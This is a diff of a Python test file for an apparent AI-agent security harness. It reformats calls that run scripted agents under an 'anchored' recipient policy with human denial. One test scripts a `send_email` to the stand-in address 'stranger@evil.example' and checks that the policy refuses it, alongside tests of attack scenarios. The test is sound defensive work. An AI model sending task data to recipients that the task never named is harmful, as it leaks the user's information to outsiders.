@@ -107,8 +107,9 @@ async def test_the_task_reaches_the_proxy_and_anchors_a_recipient():
             {"tool": "send_email", "args": {"to": "ally@partner.example", "body": "report"}},
         ],
     )
-    result = await run_once(s, "anchored", ScriptedAgent(scripted_calls(s)),
-                            policy_dir=POLICIES, human="deny")
+    result = await run_once(
+        s, "anchored", ScriptedAgent(scripted_calls(s)), policy_dir=POLICIES, human="deny"
+    )
 
     assert result.error == ""
     assert [c.tool for c in result.executed] == ["read_email", "send_email"]
@@ -125,8 +126,9 @@ async def test_a_recipient_absent_from_the_task_is_refused_under_deny():
             {"tool": "send_email", "args": {"to": "stranger@evil.example", "body": "report"}},
         ],
     )
-    result = await run_once(s, "anchored", ScriptedAgent(scripted_calls(s)),
-                            policy_dir=POLICIES, human="deny")
+    result = await run_once(
+        s, "anchored", ScriptedAgent(scripted_calls(s)), policy_dir=POLICIES, human="deny"
+    )
 
     assert result.error == ""
     assert [c.tool for c in result.executed] == ["read_email"]
@@ -188,8 +190,9 @@ def test_no_twin_trips_its_attack_predicates():
 
 async def _anchored(scenario_id: str):
     s = load_scenario(ADAPTIVE / f"{scenario_id}.yaml")
-    result = await run_once(s, "anchored", ScriptedAgent(scripted_calls(s)),
-                            policy_dir=POLICIES, human="deny")
+    result = await run_once(
+        s, "anchored", ScriptedAgent(scripted_calls(s)), policy_dir=POLICIES, human="deny"
+    )
     assert result.error == ""
     return result.outcome
 
